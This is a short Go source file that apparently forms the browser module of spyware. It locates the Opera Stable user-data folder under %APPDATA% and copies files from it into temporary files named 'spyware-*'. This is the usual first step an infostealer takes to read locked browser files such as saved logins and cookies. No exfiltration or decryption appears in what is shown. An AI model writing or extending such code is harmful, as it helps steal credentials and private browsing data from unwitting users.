package opera

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func GetOperaUserDataPath() (string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	return filepath.Join(appData, "Opera Software", "Opera Stable"), nil
}

func GetOperaProfilePaths() ([]string, error) {
	userDataPath, err := GetOperaUserDataPath()
	if err != nil {
		return nil, err
	}

	return []string{userDataPath}, nil
}

func CopyFile(src string) (string, error) {
	dst, err := os.CreateTemp("", "spyware-*")
	if err != nil {
		return "", err
	}
	defer dst.Close()

	srcFile, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()

	_, err = io.Copy(dst, srcFile)
	if err != nil {
		return "", err
	}

	return dst.Name(), nil
}
